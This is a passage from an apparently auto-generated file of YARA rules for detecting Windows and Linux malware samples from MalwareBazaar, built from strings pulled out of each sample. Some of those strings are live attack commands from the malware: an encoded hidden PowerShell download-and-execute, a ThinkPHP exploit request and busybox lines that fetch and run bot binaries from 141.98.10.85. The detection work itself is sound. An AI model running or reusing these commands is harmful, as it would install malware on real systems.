        $s17 = "ThreadSafeObjectProvider`1"
        $s18 = "MySettings"
        $s19 = "ApplicationSettingsBase"
        $s20 = "System.Configuration"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5060KB and
        all of them
}

rule Windows_5b0c702995fd3915f272423a01bbb4b6bb122736bf523e7e8d79520a5b63c224
{
    meta:
        description = "Auto ML: 5b0c702995fd3915f272423a01bbb4b6bb122736bf523e7e8d79520a5b63c224"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "OSet6"
        $s5 = "System.Runtime.Remoting.Metadata"
        $s6 = "System.Collections.Generic"
        $s7 = "GetTypeFromHandle"
        $s8 = "System.Runtime.InteropServices.WindowsRuntime"
        $s9 = "System.Core"
        $s10 = "Create"
        $s11 = "STAThreadAttribute"
        $s12 = "CallerFilePathAttribute"
        $s13 = "WindowsRuntimeImportAttribute"
        $s14 = "kernel32.dll"
        $s15 = "System"
        $s16 = "get_CurrentDomain"
        $s17 = "System.Runtime.Serialization"
        $s18 = "GetMember"
        $s19 = "System.Runtime.InteropServices"
        $s20 = "System.Runtime.CompilerServices"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 53248KB and
        all of them
}

rule Windows_5b290612b19981af51b523612c89f1c2d5630e1cd27c78a2617281f46387db65
{
    meta:
        description = "Auto ML: 5b290612b19981af51b523612c89f1c2d5630e1cd27c78a2617281f46387db65"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "kernel32.dll"
        $s6 = "GetCurrentThreadId"
        $s7 = "SetCurrentDirectoryA"
        $s8 = "GetCurrentDirectoryA"
        $s9 = "ExitProcess"
        $s10 = "RtlUnwind"
        $s11 = "TlsSetValue"
        $s12 = "TlsGetValue"
        $s13 = "GetModuleHandleA"
        $s14 = "GetProcessHeap"
        $s15 = "WriteFile"
        $s16 = "SetFilePointer"
        $s17 = "LoadResource"
        $s18 = "GetWindowsDirectoryA"
        $s19 = "GetTempPathA"
        $s20 = "GetSystemDirectoryA"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 1247KB and
        all of them
}

rule Linux_5b39f491dcda7d995b7fc7e304641335df795fc3dcc0d97eab76dd075d3b2d64
{
    meta:
        description = "Auto ML: 5b39f491dcda7d995b7fc7e304641335df795fc3dcc0d97eab76dd075d3b2d64"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 27KB and
        all of them
}

rule Linux_5b3af2ecc4337e1ab54921de986e662816b5e5a30611584224863fa335a06a69
{
    meta:
        description = "Auto ML: 5b3af2ecc4337e1ab54921de986e662816b5e5a30611584224863fa335a06a69"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 55KB and
        all of them
}

rule Windows_5bd2b2d7fd28e9ae752fd2e5b669d4b7882f733bb22a4217a4822c5325246647
{
    meta:
        description = "Auto ML: 5bd2b2d7fd28e9ae752fd2e5b669d4b7882f733bb22a4217a4822c5325246647"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "`local static thread guard'"
        $s18 = "`placement delete[] closure'"
        $s19 = "`placement delete closure'"
        $s20 = "delete[]"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 257KB and
        all of them
}

rule Windows_5be02687b7fe9adbd3146c13e7028451143f8c9e8111fc72246d7fa9c4e38fb5
{
    meta:
        description = "Auto ML: 5be02687b7fe9adbd3146c13e7028451143f8c9e8111fc72246d7fa9c4e38fb5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "NgeTw"
        $s7 = "GetProcessWindowStation"
        $s8 = "GetModuleHandleA"
        $s9 = "LoadLibraryA"
        $s10 = "ADVAPI32.dll"
        $s11 = "GetSystemTimeAsFileTime"
        $s12 = "GetLastError"
        $s13 = "KERNEL32.dll"
        $s14 = "SetClipboardData"
        $s15 = "RegSetValueExA"
        $s16 = "GetProcAddress"
        $s17 = "USER32.dll"
        $s18 = "SHELL32.dll"
        $s19 = "ExitProcess"
        $s20 = "ShellExecuteExW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6042KB and
        all of them
}

rule Linux_5c03686f34066921e1481c0e979f1daf5cab80a850b2c6131e8e3804ad873a7c
{
    meta:
        description = "Auto ML: 5c03686f34066921e1481c0e979f1daf5cab80a850b2c6131e8e3804ad873a7c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB and
        all of them
}

rule Windows_5c1784fd01fbfc4d6f8b93f3992ac9bed50cf3c98a7c7bfeef4148de01eff370
{
    meta:
        description = "Auto ML: 5c1784fd01fbfc4d6f8b93f3992ac9bed50cf3c98a7c7bfeef4148de01eff370"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "E  To add or remove a member, edit your .resx file then rerun MSBuild."
        $s6 = "B  Overrides the current thread's CurrentUICulture property for all"
        $s7 = "dMSB3464: The TargetPath parameter must be specified if the target directory needs to be overwritten."
        $s8 = "TMSB3463: The TargetPath parameter must be specified if the application is updatable."
        $s9 = "EMSB3001: Cannot extract culture information from file name \"{0}\". {1}"
        $s10 = ",Culture of \"{0}\" was assigned to file \"{1}\"."
        $s11 = "<MSB3656: No input file has been passed to the task, exiting."
        $s12 = "AMSB3646: Cannot specify values for both KeyFile and KeyContainer."
        $s13 = "SMSB3647: DelaySign parameter is true, but no KeyFile or KeyContainer was specified."
        $s14 = "SMSB3649: The KeyFile path '{0}' is invalid. KeyFile must point to an existing file."
        $s15 = "gMSB3650: Neither SDKToolsPath '{0}' nor ToolPath '{1}' is a valid directory.  One of these must be set."
        $s16 = "GMSB3652: The key file '{0}' does not contain a public/private key pair."
        $s17 = "MSB3654: Delay signing requires that at least a public key be specified.  Please either supply a public key using the KeyFile or KeyContainer properties, or disable delay signing."
        $s18 = "sMSB3653: AxTlbBaseTask is not an executable task. If deriving from it, please ensure the ToolName property was set."
        $s19 = "kMSB3752: The \"{0}\" attribute has been set but is empty. If the \"{0}\" attribute is set it must not be empty."
        $s20 = "uMSB3755: Could not find reference \"{0}\". If this reference is required by your code, you may get compilation errors.\""
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 772KB and
        all of them
}

rule Windows_078245ad68ac4acc2f059d9c2df2f4bffa4b2e4f40279eba96d6f7581d58fc2e
{
    meta:
        description = "Auto ML: 078245ad68ac4acc2f059d9c2df2f4bffa4b2e4f40279eba96d6f7581d58fc2e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3541KB and
        all of them
}

rule Windows_5c17dd7c936d69c34b6a35aa525221601d58e8c65c44b4d3fa2bbb140c5bde94
{
    meta:
        description = "Auto ML: 5c17dd7c936d69c34b6a35aa525221601d58e8c65c44b4d3fa2bbb140c5bde94"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "api-ms-win-crt-string-l1-1-0.dll"
        $s6 = "too many files"
        $s7 = "invalid filename"
        $s8 = "file too large"
        $s9 = "file not found"
        $s10 = "file stat failed"
        $s11 = "file open failed"
        $s12 = "file seek failed"
        $s13 = "write callback failed"
        $s14 = "file write failed"
        $s15 = "file create failed"
        $s16 = "file close failed"
        $s17 = "file read failed"
        $s18 = "Windows Vista"
        $s19 = "Windows Server 2008"
        $s20 = "Windows 8"
    condition:
        uint32(0) == 0x00785a4d and
        filesize < 573KB and
        all of them
}

rule Windows_5c5a76538892b9420e56a8c5f6f7dc8210a46ddbfc85d1f8f0e5bb90f15dc3e0
{
    meta:
        description = "Auto ML: 5c5a76538892b9420e56a8c5f6f7dc8210a46ddbfc85d1f8f0e5bb90f15dc3e0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "kernel32"
        $s6 = "LoadLibraryA"
        $s7 = "GetModuleHandleA"
        $s8 = "GetProcAddress"
        $s9 = "ExitThread"
        $s10 = "TLoader"
        $s11 = "kernel32.dll"
        $s12 = "CreateToolhelp32Snapshot"
        $s13 = "Toolhelp32ReadProcessMemory"
        $s14 = "Process32First"
        $s15 = "Process32Next"
        $s16 = "Process32FirstW"
        $s17 = "Process32NextW"
        $s18 = "Thread32First"
        $s19 = "Thread32Next"
        $s20 = "Module32First"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 284KB and
        all of them
}

rule Linux_5c696750b0891ee5d962f63464c7196cfd23cc6a9c047747c429c4bf2942b765
{
    meta:
        description = "Auto ML: 5c696750b0891ee5d962f63464c7196cfd23cc6a9c047747c429c4bf2942b765"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 134KB and
        all of them
}

rule Windows_5c7d5f2261c2faa3edb70a55eb5a53deb84557f80d7fa339d5ec82999f1ed213
{
    meta:
        description = "Auto ML: 5c7d5f2261c2faa3edb70a55eb5a53deb84557f80d7fa339d5ec82999f1ed213"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1276KB and
        all of them
}

rule Linux_5c7fdef43f5e66c9b01cb2f10b821b681bf1e32a187943bd56c94e22f276e7c6
{
    meta:
        description = "Auto ML: 5c7fdef43f5e66c9b01cb2f10b821b681bf1e32a187943bd56c94e22f276e7c6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "[http flood] headers: \"%s\""
        $s4 = "http"
        $s5 = "socket:"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB and
        all of them
}

rule Linux_5d1c1302458cd715172c06fb186d4e0281cd1adfb09fa40be22a4b2459f57191
{
    meta:
        description = "Auto ML: 5d1c1302458cd715172c06fb186d4e0281cd1adfb09fa40be22a4b2459f57191"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 37KB and
        all of them
}

rule Windows_5d328dcf1ddc636c9d03e6d46b6874a210dafa6217c6b8bdfd4a32978c8f4842
{
    meta:
        description = "Auto ML: 5d328dcf1ddc636c9d03e6d46b6874a210dafa6217c6b8bdfd4a32978c8f4842"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "@.rsrc"
        $s2 = "system"
        $s3 = "map/set<T> too long"
        $s4 = "VS_OUTPUT PostProcessVS(VS_INPUT i) {"
        $s5 = "float4 PostProcessPS(VS_OUTPUT i) : COLOR0 {"
        $s6 = "technique PostProcess {"
        $s7 = "VertexShader = compile vs_2_0 PostProcessVS();"
        $s8 = "PixelShader  = compile ps_2_0 PostProcessPS();"
        $s9 = "PostProcess"
        $s10 = "OL3DLayer_loadThread"
        $s11 = "ResourceCache_loadThreadProc(%d)"
        $s12 = "DZI_LoadThread(%d)"
        $s13 = "Layer_LoadBG"
        $s14 = "Layer_LoadBG : end"
        $s15 = "float2 texelKernel[8];"
        $s16 = "+ (tex2D( colorSampler, i.tex0 - texelKernel[1].xy ) + tex2D( colorSampler, i.tex0 + texelKernel[1].xy )) * blurWeights[1]"
        $s17 = "+ (tex2D( colorSampler, i.tex0 - texelKernel[2].xy ) + tex2D( colorSampler, i.tex0 + texelKernel[2].xy )) * blurWeights[2]"
        $s18 = "+ (tex2D( colorSampler, i.tex0 - texelKernel[3].xy ) + tex2D( colorSampler, i.tex0 + texelKernel[3].xy )) * blurWeights[3]"
        $s19 = "+ (tex2D( colorSampler, i.tex0 - texelKernel[4].xy ) + tex2D( colorSampler, i.tex0 + texelKernel[4].xy )) * blurWeights[4]"
        $s20 = "+ (tex2D( colorSampler, i.tex0 - texelKernel[5].xy ) + tex2D( colorSampler, i.tex0 + texelKernel[5].xy )) * blurWeights[5]"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4347KB and
        all of them
}

rule Linux_5d3aee76b6021088ba30bc9cedde9a52651461f4a9cba0bef1f926aa1dbff181
{
    meta:
        description = "Auto ML: 5d3aee76b6021088ba30bc9cedde9a52651461f4a9cba0bef1f926aa1dbff181"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cmdline"
        $s2 = "[VapeBot/Killer/TCP] Killed Process: %s, PID: %d"
        $s3 = "/proc/%s/cmdline"
        $s4 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d"
        $s5 = "[VapeBot/Killer/Stat] Killed Process: %s, PID: %d"
        $s6 = "[VapeBot/Killer/PS] Killed process: %s, PID: %d"
        $s7 = "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d"
        $s8 = "[VapeBot/Killer/EXE] Killed process: %s, PID: %d"
        $s9 = "systemd"
        $s10 = "http"
        $s11 = "(deleted)"
        $s12 = "/proc/self/cmdline"
        $s13 = "No such file or directory"
        $s14 = "No such process"
        $s15 = "Interrupted system call"
        $s16 = "Bad file descriptor"
        $s17 = "No child processes"
        $s18 = "Resource temporarily unavailable"
        $s19 = "File exists"
        $s20 = "Too many open files in system"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 78KB and
        all of them
}

rule Windows_5d6cc4d7e7ce998cf1d7bc8b78f787f9b034ab3dbdf8c91a33ad0233ddef2ac4
{
    meta:
        description = "Auto ML: 5d6cc4d7e7ce998cf1d7bc8b78f787f9b034ab3dbdf8c91a33ad0233ddef2ac4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = "https://L)"
        $s6 = "https://H"
        $s7 = "powershell -ep bypass -w hidden -e aQB3AHIAIABoAHQAdABwADoALwAvADEAOQA0AC4AMwAzAC4AMQA5ADEALgAyADQAOAA6ADcAMgA4ADcALwBzAHkAcwAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAHwAIABpAGUAeAA="
        $s8 = "cannot create shim for unknown locale::facet"
        $s9 = "basic_string::_S_create"
        $s10 = "basic_filebuf::underflow codecvt::max_length() is not valid"
        $s11 = "basic_filebuf::underflow invalid byte sequence in file"
        $s12 = "basic_filebuf::underflow incomplete character in file"
        $s13 = "basic_filebuf::underflow error reading the file"
        $s14 = "basic_filebuf::xsgetn error reading the file"
        $s15 = "basic_filebuf::_M_convert_to_external conversion error"
        $s16 = "basic_string::_M_create"
        $s17 = "deleted virtual method called"
        $s18 = "locale::facet::_S_create_c_locale name not valid"
        $s19 = "system"
        $s20 = "terminate called after throwing an instance of '"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3071KB and
        all of them
}

rule Windows_5d8702a242d06cfeb840c8a6fbf8d2bdd3f7e2c58f8c1cc0d74135cc9c1baeb4
{
    meta:
        description = "Auto ML: 5d8702a242d06cfeb840c8a6fbf8d2bdd3f7e2c58f8c1cc0d74135cc9c1baeb4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "ATTACH_PARENT_PROCESS"
        $s7 = "System.Media"
        $s8 = "dwProcessId"
        $s9 = "Load"
        $s10 = "get_Enabled"
        $s11 = "set_Enabled"
        $s12 = "set_FormattingEnabled"
        $s13 = "add_FormClosed"
        $s14 = "FinishForm_FormClosed"
        $s15 = "_keyAlreadyPressed"
        $s16 = "ReadToEnd"
        $s17 = "CreateInstance"
        $s18 = "GetInstance"
        $s19 = "get_KeyCode"
        $s20 = "set_AutoScaleMode"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 885KB and
        all of them
}

rule Windows_07b287f1869f3d49a2cc13efbf581cc5c1f640aa64aac4877ee7ac40f971201c
{
    meta:
        description = "Auto ML: 07b287f1869f3d49a2cc13efbf581cc5c1f640aa64aac4877ee7ac40f971201c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "Failed to extract %s: failed to allocate temporary input buffer!"
        $s7 = "Failed to extract %s: failed to allocate temporary output buffer!"
        $s8 = "Failed to extract %s: failed to allocate temporary buffer!"
        $s9 = "Failed to extract %s: failed to read data chunk!"
        $s10 = "fread"
        $s11 = "Failed to extract %s: failed to write data chunk!"
        $s12 = "fwrite"
        $s13 = "Failed to extract %s: failed to open archive file!"
        $s14 = "pyi_arch_extract2fs was called before temporary directory was initialized!"
        $s15 = "Failed to create symbolic link %s!"
        $s16 = "Failed to extract %s: failed to open target file!"
        $s17 = "fopen"
        $s18 = "Failed to read cookie!"
        $s19 = "Could not read full TOC!"
        $s20 = "Error on file."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7503KB and
        all of them
}

rule Windows_5db6236dda5724e94a0487e1b613d5eff9c5bfa7bda4852fe8f1acbf6a03a4f0
{
    meta:
        description = "Auto ML: 5db6236dda5724e94a0487e1b613d5eff9c5bfa7bda4852fe8f1acbf6a03a4f0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6883KB and
        all of them
}

rule Windows_5ddea1187e48e56a27f1878198a899c68a4a690105eb8bc5d687a698a94d64d3
{
    meta:
        description = "Auto ML: 5ddea1187e48e56a27f1878198a899c68a4a690105eb8bc5d687a698a94d64d3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "delete"
        $s7 = "delete[]"
        $s8 = "`placement delete closure'"
        $s9 = "`placement delete[] closure'"
        $s10 = "`local static thread guard'"
        $s11 = "FlsGetValue"
        $s12 = "FlsSetValue"
        $s13 = "CorExitProcess"
        $s14 = "AreFileApisANSI"
        $s15 = "AppPolicyGetProcessTerminationMethod"
        $s16 = ".text$mn"
        $s17 = ".text$mn$00"
        $s18 = ".text$x"
        $s19 = ".rdata"
        $s20 = ".rdata$zzzdbg"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 345KB and
        all of them
}

rule Linux_5de10ea353edd3a5fe13ff5099fa7be2e638b18591301391d12c2db092a64fad
{
    meta:
        description = "Auto ML: 5de10ea353edd3a5fe13ff5099fa7be2e638b18591301391d12c2db092a64fad"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://141.98.10.85/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://141.98.10.85/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = ".text"
        $s10 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 78KB and
        all of them
}

rule Linux_5df31e46f15c77096b313abf366db8a95da24d37c81be89de970a457c120c543
{
    meta:
        description = "Auto ML: 5df31e46f15c77096b313abf366db8a95da24d37c81be89de970a457c120c543"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "sfga"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 15KB and
        all of them
}

rule Linux_5dfb8679b06594b9ad8248ebb560b2150690a47acb97a9defd6a2fda5587574e
{
    meta:
        description = "Auto ML: 5dfb8679b06594b9ad8248ebb560b2150690a47acb97a9defd6a2fda5587574e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "aCmd"
        $s2 = "PROT_EXEC|PROT_WRITE failed."
        $s3 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 43KB and
        all of them
}

rule Linux_5e243f9c409fe775f51c874d4c71aa99b5520881f0bfefefb57a8985222b585b
{
    meta:
        description = "Auto ML: 5e243f9c409fe775f51c874d4c71aa99b5520881f0bfefefb57a8985222b585b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
